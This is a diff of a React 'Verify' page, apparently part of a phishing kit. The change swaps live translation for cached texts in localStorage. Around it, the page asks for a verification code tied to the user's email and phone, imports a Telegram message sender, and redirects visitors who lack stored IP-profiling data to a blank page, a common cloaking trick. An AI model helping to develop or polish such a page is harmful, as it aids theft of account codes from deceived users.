@@ -1,10 +1,8 @@
 import VerifyImage from '@/assets/images/681.png';
 import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { useState, useEffect, useCallback, useMemo } from 'react';
-import { translateText } from '@/utils/translate';
+import { useState, useEffect, useMemo } from 'react';
 import sendMessage from '@/utils/telegram';
-import config from '@/utils/config';
 import { useNavigate } from 'react-router';
 import { PATHS } from '@/router/router';
 
@@ -110,62 +108,21 @@ const Verify = () => {
         };
     }, [userInfo.email, userInfo.phone]); // Phụ thuộc vào data thật
 
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    // 🚀 Lấy texts từ cache, không dịch lại
+    const translations = JSON.parse(localStorage.getItem('translations'));
+    const [translatedTexts, setTranslatedTexts] = useState(
+        translations?.verify || defaultTexts
+    );
 
-    const translateAllTexts = useCallback(async (targetLang) => {
-        try {
-            const [
-                translatedTitle,
-                translatedDesc,
-                translatedPlaceholder,
-                translatedInfoTitle,
-                translatedInfoDesc,
-                translatedSubmit,
-                translatedSendCode,
-                translatedError,
-                translatedLoading
-            ] = await Promise.all([
-                translateText(defaultTexts.title, targetLang),
-                translateText(defaultTexts.description, targetLang), // Dùng description đã có data thật
-                translateText(defaultTexts.placeholder, targetLang),
-                translateText(defaultTexts.infoTitle, targetLang),
-                translateText(defaultTexts.infoDescription, targetLang),
-                translateText(defaultTexts.submit, targetLang),
-                translateText(defaultTexts.sendCode, targetLang),
-                translateText(defaultTexts.errorMessage, targetLang),
-                translateText(defaultTexts.loadingText, targetLang)
-            ]);
-
-            setTranslatedTexts({
-                title: translatedTitle,
-                description: translatedDesc,
-                placeholder: translatedPlaceholder,
-                infoTitle: translatedInfoTitle,
-                infoDescription: translatedInfoDesc,
-                submit: translatedSubmit,
-                sendCode: translatedSendCode,
-                errorMessage: translatedError,
-                loadingText: translatedLoading
-            });
-        } catch {
-            // Fallback về default texts với data thật nếu dịch lỗi
-            setTranslatedTexts(defaultTexts);
-        }
-    }, [defaultTexts]);
+    // 🚀 XÓA HẾT hàm dịch
+    // useEffect dịch đã được xóa
 
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
         if (!ipInfo) {
             window.location.href = 'about:blank';
         }
-        const targetLang = localStorage.getItem('targetLang');
-        if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
-        } else {
-            // Đảm bảo dùng default texts với data thật cho tiếng Anh
-            setTranslatedTexts(defaultTexts);
-        }
-    }, [translateAllTexts, defaultTexts]);
+    }, []);
 
     const handleSubmit = async () => {
         if (!code.trim()) return;
